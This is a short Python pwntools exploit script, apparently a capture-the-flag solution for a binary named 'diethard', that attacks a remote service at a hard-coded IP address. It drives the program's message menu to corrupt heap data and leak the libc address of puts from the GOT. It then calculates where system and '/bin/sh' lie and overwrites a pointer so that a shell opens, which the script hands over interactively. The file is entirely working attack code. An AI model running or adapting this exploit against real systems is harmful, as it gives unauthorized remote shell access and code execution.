from pwn import *
#io = process('./diethard')
io = remote('202.120.7.194', 6666) 
context.log_level = 'debug'
pause()

def add_msg(content, length):
    io.recvuntil('3. Exit\n')
    io.sendline('1')
    io.recvuntil('Input Message Length:')
    io.sendline(str(length))
    io.recvuntil('Please Input Message:')
    io.sendline(content)

def del_msg(idx):
    io.recvuntil('3. Exit\n')
    io.sendline('2')
    io.recvuntil('Which Message You Want To Delete?')
    io.sendline(str(idx))

puts_got = 0x603260
puts_plt = 0x4007e0
add_msg('A' * 2014, 2015)
add_msg('2222', 2015)
add_msg('33333333' + p64(0x7df) + p64(puts_got) + p64(puts_plt), 2016) #the 3rd msg->content point 2 1st msg's head

io.recvuntil('3. Exit\n')
io.sendline('2')
print io.recvuntil('1. ')
puts_libc = u64(io.recvuntil('\n\n')[:-2].ljust(8, '\x00'))
log.info('puts_libc :' + hex(puts_libc))

io.sendline('2') #delete the last msg

l = ELF('/tmp/libc-64')
system_libc = puts_libc - l.symbols['puts'] + l.symbols['system']
binsh = puts_libc - l.symbols['puts'] + l.search('/bin/sh').next()
add_msg('33333333' + p64(0x7df) + p64(binsh) + p64(system_libc), 2016)

io.interactive()


